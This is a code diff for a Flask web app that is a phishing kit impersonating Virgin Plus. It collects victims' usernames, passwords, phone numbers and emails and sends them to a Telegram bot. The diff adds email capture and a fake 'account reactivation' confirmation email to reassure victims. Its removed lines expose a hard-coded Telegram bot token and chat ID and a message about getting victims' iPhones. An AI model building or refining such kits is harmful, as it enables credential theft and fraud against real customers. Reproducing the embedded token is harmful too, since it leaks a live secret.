@@ -1,14 +1,36 @@
+from dotenv import load_dotenv
+load_dotenv()
 from flask import Flask, render_template, request, redirect, url_for, session
 import requests
 import random
 import string
+from flask_mail import Mail, Message
+import os
+from dotenv import load_dotenv  # Only if using a .env file
+import smtplib
+from email.mime.text import MIMEText
+
+
+# Load environment variables from .env file (if using)
+load_dotenv()
 
 app = Flask(__name__)
-app.secret_key = "some_random_secret_key_here"
+app.secret_key = os.environ.get("SECRET_KEY", "fallback_secret_key")  # Replace with a strong, random secret key
 
-# Your real Telegram credentials
-TELEGRAM_BOT_TOKEN = "7321008127:AAEF8dr-B-b_hLkjA1qcXl07askvu0fRggs"
-TELEGRAM_CHAT_ID = "-1002441207907"
+# Telegram credentials
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
+
+# Flask-Mail configuration using environment variables
+app.config.update(
+    MAIL_SERVER='smtp.gmail.com',
+    MAIL_PORT=587,
+    MAIL_USE_TLS=True,
+    MAIL_USERNAME=os.environ.get("MAIL_USERNAME"),
+    MAIL_PASSWORD=os.environ.get("MAIL_PASSWORD")
+)
+
+mail = Mail(app)
 
 def send_to_telegram(message_text):
     """Helper: send text to your Telegram bot/channel."""
@@ -22,6 +44,22 @@ def send_to_telegram(message_text):
         requests.post(url, data=payload)
     except Exception as e:
         print("Telegram send error:", e)
+
+def send_confirmation_email(to_email):
+    """Send a confirmation email to the user."""
+    try:
+        msg = Message(
+            subject="Account Reactivation Confirmation",
+            sender=app.config['MAIL_USERNAME'],
+            recipients=[to_email]
+        )
+        msg.body = "You have successfully reactivated your account. Thank you!"
+        # For HTML emails, uncomment the next line and create a corresponding template
+        # msg.html = render_template("confirmation_email.html")
+        mail.send(msg)
+        print(f">>> Confirmation email sent to {to_email}")
+    except Exception as e:
+        print("Error sending confirmation email:", e)
 
 def generate_captcha(length=6):
     """Generate a random alphanumeric CAPTCHA code."""
@@ -43,7 +81,7 @@ def captcha():
         if user_captcha.lower() == real_captcha.lower():
             # CAPTCHA passed
             visitor_ip = request.remote_addr
-            custom_message = f"A user from IP {visitor_ip} has entered diddies den. lets pray we get all their iphones."
+            custom_message = f"A user from IP {visitor_ip} has entered the site."
             send_to_telegram(custom_message)
             session["captcha_passed"] = True
             return redirect(url_for("home"))
@@ -87,14 +125,17 @@ def loading():
 @app.route("/verify", methods=["GET", "POST"])
 def verify():
     """
-    If GET: Show verify.html (phone form).
-    If POST: Save phone in session, then redirect to /final_loading.
+    If GET: Show verify.html (phone and email form).
+    If POST: Save phone and email in session, then redirect to /final_loading.
     """
     if request.method == "POST":
         phone_number = request.form.get("phone_number")
+        email = request.form.get("email")
         session["phone_number"] = phone_number
+        session["email"] = email
 
         print(">>> POST /verify - phone_number=", phone_number)
+        print(">>> POST /verify - email=", email)
 
         return redirect(url_for("final_loading"))
     else:
@@ -112,21 +153,26 @@ def final_loading():
 @app.route("/send_data")
 def send_data():
     """
-    Gathers username/password/phone from session -> sends to Telegram,
-    clears session, then redirect to /success.
+    Gathers username/password/phone/email from session -> sends to Telegram,
+    sends confirmation email to user, clears session, then redirect to /success.
     """
     user = session.get("username", "N/A")
     pw = session.get("password", "N/A")
     phone = session.get("phone_number", "N/A")
+    email = session.get("email", "N/A")
 
-    print(">>> GET /send_data - about to send Telegram message")
+    print(">>> GET /send_data - about to send Telegram message and confirmation email")
     message_text = (
         f"Virgin Plus Verification:\n"
         f"Username: {user}\n"
         f"Password: {pw}\n"
-        f"Phone: {phone}"
+        f"Phone: {phone}\n"
+        f"Email: {email}"
     )
     send_to_telegram(message_text)
+
+    if email != "N/A":
+        send_confirmation_email(email)
 
     session.clear()
     return redirect(url_for("success"))
@@ -136,6 +182,10 @@ def success():
     """Final 'reactivated' page with link to official site."""
     print(">>> GET /success - Rendering success.html")
     return render_template("success.html")
+
+
+
+    
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
